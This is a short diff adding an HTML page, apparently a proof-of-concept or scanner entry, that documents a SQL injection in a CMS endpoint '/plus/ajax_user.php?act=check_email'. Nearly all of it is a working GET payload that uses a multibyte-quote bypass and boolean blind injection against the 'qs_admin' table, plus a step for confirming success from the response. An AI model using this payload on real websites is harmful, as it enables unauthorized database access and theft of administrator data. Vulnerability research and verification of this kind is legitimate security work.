@@ -1,0 +1,11 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入 URL: </h3>
+    <ul>
+        <p>/plus/ajax_user.php?act=check_email</p>
+    </ul>
+    <h3>GET-payload: </h3>
+        <code>email=s%e9%8c%a6' or cast(ascii(substring((select md5(c) from qs_admin),2,1))>100 as signed) %23</code>
+    <h3>验证过程</h3>
+    <p>查看response text 是否含有"c"的md5值 "4a8a08f09d37b73795649038408b5f33"</p>
+</div>
